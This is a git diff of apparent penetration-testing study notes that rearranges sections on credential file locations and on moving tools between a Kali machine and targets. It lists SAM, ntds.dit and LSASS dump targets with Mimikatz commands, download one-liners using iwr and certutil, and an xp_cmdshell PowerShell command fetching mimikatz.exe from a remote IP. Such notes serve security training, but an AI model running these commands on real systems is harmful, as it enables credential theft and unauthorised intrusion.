@@ -271,7 +271,7 @@ Kali port:
   - **C:\Windows\System32\config\SYSTEM**
   - C:\Windows\System32\config\SECURITY
   - C:\Windows\NTDS\ntds.dit
-  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`  **
+  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`**
   - LSASS memory dump `lsass.dmp`
   - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
   - task scheduler XML files: C:\Windows\System32\Tasks\
@@ -293,27 +293,20 @@ Kali port:
   - **Sensitive files for privilege escalation**
     - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
     - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
-  - Configs
-    - /etc/apache2/sites-available/
-    - /etc/nginx/sites-available/
-    - /etc/apache2/sites-available/
-    - /etc/cron*/*
-    - crontab -l for each user
-  - Application credential files
-    - /var/www/html/config.php (web apps)
-    - wp-config.php (WordPress)
-  - Logs & Audit
-    - /var/log/auth.log → login attempts, sudo usage
-    - /var/log/secure → login/authentication info
-    - /var/log/syslog → system log
 - Windows from/to Kali
   - **RDP mounting shared folder**  
     `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
     `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
+- **Transfer exploits to Kali**
+  - ❗**`scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`** 
 - **Transfer exploits to windows**
-   - `iwr http://<Kali-IP>/file.exe -OutFile file.exe`  
+   -  ```
+      cd /var/www/html
+      sudo python3 -m http.server 80
+      nc <target> <port>
+      iwr -uri http://<kali>/<program> -Outfile <program>  
+      ```
    - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
-   - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
    -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
    -  Target execute the payload over internet
       ```
@@ -326,14 +319,7 @@ Kali port:
       ```
 - Windows to Kali 
   - Internet access
-    - Download Kali exe to target
-      ```
-      cd /var/www/html
-      sudo python3 -m http.server 80
-      nc <target> <port>
-      iwr -uri http://<kali>/<program> -Outfile <program>  
-      ```
-    - UploadServer (nc, No GUI, no credentails)
+    - ❗**UploadServer (nc, No GUI, no credentails)**
       ```
       #kali
       mkdir -p /home/kali/uploads
